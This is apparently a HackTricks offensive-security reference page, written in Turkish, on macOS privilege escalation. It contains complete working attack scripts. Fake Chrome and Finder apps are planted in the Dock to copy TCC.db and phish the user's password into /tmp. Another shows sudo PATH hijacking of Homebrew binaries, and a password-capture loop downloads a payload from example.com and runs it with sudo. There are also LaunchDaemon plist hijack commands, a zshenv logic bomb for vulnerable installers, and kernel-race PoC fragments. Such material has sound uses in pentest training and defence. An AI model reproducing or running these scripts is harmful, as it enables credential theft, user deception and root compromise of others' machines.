# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation arıyorsanız şuraya gidin:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Lütfen **Linux/Unix'i etkileyen privilege escalation tekniklerinin çoğunun MacOS** makinelerini de etkileyeceğini unutmayın. Bu nedenle şuraya bakın:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Orijinal [Sudo Hijacking tekniğini Linux Privilege Escalation gönderisinde](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.

Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değerini **korur**. Bu da bu saldırıyı gerçekleştirmenin başka bir yolunun, kurban **sudo çalıştırırken** çalıştıracağı diğer binary'leri **hijack etmek** olacağı anlamına gelir:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Bir terminal kullanan kullanıcının büyük olasılıkla **Homebrew installed** olduğunu unutmayın. Bu nedenle **`/opt/homebrew/bin`** içindeki binary'leri **hijack** etmek mümkündür.

### Dock Impersonation

Bir miktar **social engineering** kullanarak Dock içinde örneğin **Google Chrome'u impersonate** edebilir ve aslında kendi script'inizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Bazı öneriler:

- Dock'ta Chrome olup olmadığını kontrol edin; varsa bu girdiyi **kaldırın** ve Dock array'inde **aynı konuma** **fake** **Chrome girdisini ekleyin**.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- **Finder'ı Dock'tan kaldıramazsınız**, bu nedenle onu Dock'a ekleyecekseniz sahte Finder'ı gerçek Finder'ın hemen yanına yerleştirebilirsiniz. Bunun için **sahte Finder girdisini Dock array'inin başına eklemeniz gerekir**.
- Başka bir seçenek ise onu Dock'a yerleştirmeyip yalnızca açmaktır; "Finder, Finder'ı denetlemek istiyor" ifadesi o kadar da garip değildir.
- Korkunç bir kutuyla parola sormadan **root'a yükselmenin** başka bir yolu, Finder'ın ayrıcalıklı bir işlem gerçekleştirmek için gerçekten parola sormasını sağlamaktır:
- Finder'dan yeni bir **`sudo`** dosyasını **`/etc/pam.d`** dizinine kopyalamasını isteyin (Parolayı isteyen istem, "Finder sudo'yu kopyalamak istiyor" ifadesini gösterecektir)
- Yeni bir **Authorization Plugin** kopyalamasını Finder'dan isteyin (Dosya adını kontrol edebileceğiniz için parolayı isteyen istem, "Finder Finder.bundle'u kopyalamak istiyor" ifadesini gösterecektir)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware, kullanıcı etkileşimini **sudo yetkisine sahip bir parolayı ele geçirmek** ve bunu programatik olarak yeniden kullanmak için sıkça kötüye kullanır. Yaygın akış:

1. `whoami` ile oturum açmış kullanıcıyı belirleyin.
2. `dscl . -authonly "$user" "$pw"` başarılı olana kadar **parola istemlerini döngüye alın**.
3. Kimlik bilgisini (ör. `/tmp/.pass`) önbelleğe alın ve ayrıcalıklı işlemleri `sudo -S` ile (parolayı stdin üzerinden göndererek) gerçekleştirin.

Örnek minimal zincir:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Çalınan parola daha sonra **`xattr -c` ile Gatekeeper quarantine'i temizlemek**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşimli olmayan şekilde çalıştırmak için yeniden kullanılabilir.

## Daha yeni macOS'e özgü vektörler (2023–2025)

### Kullanımdan kaldırılan `AuthorizationExecuteWithPrivileges` hâlâ kullanılabilir

`AuthorizationExecuteWithPrivileges`, 10.7'de kullanımdan kaldırıldı ancak **Sonoma/Sequoia'da hâlâ çalışıyor**. Birçok ticari updater, güvenilmeyen bir path ile `/usr/libexec/security_authtrampoline` çağırıyor. Hedef binary kullanıcı tarafından yazılabilir durumdaysa bir trojan yerleştirip meşru prompt'u kullanabilirsiniz:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Yukarıdaki **masquerading tricks** ile birleştirerek inandırıcı bir parola diyaloğu sunun.


### Privileged helper / XPC triage

Modern üçüncü taraf macOS privesc'lerinin çoğu aynı kalıbı izler: bir **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** üzerinden bir **Mach/XPC service** sunar; ardından helper ya **client'ı doğrulamaz**, ya **çok geç doğrular** (PID race) ya da **user-controlled path/script** kullanan bir **root method** sunar. VPN client'larındaki, game launcher'larındaki ve updater'larındaki yakın tarihli birçok helper bug'ının temelindeki bug class budur.

Hızlı triage checklist'i:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Özellikle şu özelliklere sahip helper'lara dikkat edin:

- iş `launchd` içinde yüklü kaldığı için **uninstall sonrasında** da istekleri kabul etmeye devam edenler
- **`/Applications/...`** veya root olmayan kullanıcılar tarafından yazılabilir diğer path'lerden script çalıştıran ya da configuration okuyanlar
- yarış durumuna açık olabilecek **PID tabanlı** veya yalnızca **bundle-id** kullanan peer validation mekanizmalarına dayananlar

Helper authorization bug'ları hakkında daha fazla bilgi için [bu sayfaya](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) bakın.

### PackageKit script environment inheritance (CVE-2024-27822)

Apple bunu **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde düzeltene kadar, **`Installer.app`** / **`PackageKit.framework`** üzerinden kullanıcı tarafından başlatılan install işlemleri, **PKG script'lerini mevcut kullanıcının environment'ı içinde root olarak** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir package'ın saldırganın **`~/.zshenv`** dosyasını yükleyip package'ı kuran kullanıcı için **root** olarak çalıştırabileceği anlamına geliyordu.

Bu durum bir **logic bomb** olarak özellikle ilgi çekicidir: Kullanıcı hesabında bir foothold ve yazılabilir bir shell startup file elde etmeniz yeterlidir; ardından kullanıcının çalıştıracağı zsh tabanlı herhangi bir vulnerable installer'ı beklersiniz. Bu durum genellikle **MDM/Munki** deployment'ları için geçerli değildir, çünkü bunlar root kullanıcısının environment'ı içinde çalışır.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Daha derinlemesine installer-specific abuse incelemesi için [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da göz atın.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Bir LaunchDaemon plist'i veya `ProgramArguments` hedefi **user-writable** ise, bunu değiştirip launchd'yi yeniden yüklemeye zorlayarak privilege escalation gerçekleştirebilirsiniz:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Bu, **CVE-2025-24085** için yayımlanan ve yazılabilir bir plist'in root olarak attacker code çalıştırmak için kötüye kullanıldığı exploit pattern'ini yansıtır.

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` içindeki bir **race**, yerel bir saldırganın thread'ler arasında `setgid()`/`getgid()` döngülerini, parçalı bir `memcpy` gerçekleşene kadar yarıştırarak salt okunur credential pointer'ını (`proc_ro.p_ucred`) bozmasına olanak tanır. Başarılı bir corruption, **uid 0** ve kernel memory access sağlar. Minimal PoC yapısı:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Heap grooming ile birleştirerek kontrollü veriyi pointer'ın yeniden okuduğu konuma yerleştirin. Vulnerable build'lerde bu, SIP bypass gerektirmeyen güvenilir bir **local kernel privesc** sağlar.

### Migration assistant üzerinden SIP bypass ("Migraine", CVE-2023-32369)

Zaten root erişiminiz varsa SIP hâlâ system konumlarına yazılmasını engeller. **Migraine** bug'ı, bir child process oluşturup SIP bypass'ı devralmasını ve korunan path'lerin (ör. `/System/Library/LaunchDaemons`) üzerine yazmasını sağlamak için Migration Assistant entitlement'ı `com.apple.rootless.install.heritable` değerini kötüye kullanır. Zincir:

1. Çalışan bir sistemde root erişimi elde edin.
2. Saldırgan kontrollü bir binary çalıştırmak için `systemmigrationd`'yi crafted state ile tetikleyin.
3. SIP-korumalı dosyalara patch uygulamak ve reboot sonrasında da kalıcılığı sürdürmek için devralınan entitlement'ı kullanın.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Birden fazla Apple daemon'ı XPC üzerinden **NSPredicate** nesnelerini kabul eder ve yalnızca saldırgan kontrollü `expressionType` alanını doğrular. Arbitrary selector'ları değerlendiren bir predicate oluşturarak **root/system XPC services** (ör. `coreduetd`, `contextstored`) içinde **code execution** elde edebilirsiniz. Bu, başlangıçta bir app sandbox escape ile birleştirildiğinde **user prompt olmadan privilege escalation** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor içermeyen XPC endpoint'lerini arayın.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir kullanıcı** (unprivileged kullanıcılar dâhil), `-o noowners` ile bir Time Machine snapshot oluşturup mount edebilir ve canlı volume üzerindeki ownership kontrollerini bypass ederek bu snapshot'taki **TÜM dosyalara erişebilir**. Gerekli tek privilege, kullanılan uygulamanın (ör. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) yetkisine sahip olmasıdır.

Komutlar ve açıklamanın tamamı TCC bypasses sayfasındadır:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Bu, privilege escalation için faydalı olabilir:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
